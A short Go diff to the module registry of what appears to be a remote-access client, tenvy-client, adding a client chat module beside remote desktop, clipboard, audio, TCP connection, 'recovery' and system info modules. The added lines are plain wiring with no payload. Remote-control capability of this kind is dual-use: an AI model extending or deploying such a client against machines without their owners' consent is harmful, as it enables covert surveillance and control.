@@ -14,6 +14,7 @@ import (
 	remotedesktop "github.com/rootbay/tenvy-client/internal/modules/control/remotedesktop"
 	clipboard "github.com/rootbay/tenvy-client/internal/modules/management/clipboard"
 	tcpconnections "github.com/rootbay/tenvy-client/internal/modules/management/tcpconnections"
+	clientchat "github.com/rootbay/tenvy-client/internal/modules/misc/clientchat"
 	recovery "github.com/rootbay/tenvy-client/internal/modules/operations/recovery"
 	systeminfo "github.com/rootbay/tenvy-client/internal/modules/systeminfo"
 	"github.com/rootbay/tenvy-client/internal/protocol"
@@ -68,6 +69,7 @@ func newDefaultModuleRegistry() *moduleRegistry {
 	registry.register(&audioModule{})
 	registry.register(&clipboardModule{})
 	registry.register(&tcpConnectionsModule{})
+	registry.register(&clientChatModule{})
 	registry.register(&recoveryModule{})
 	registry.register(&systemInfoModule{})
 	return registry
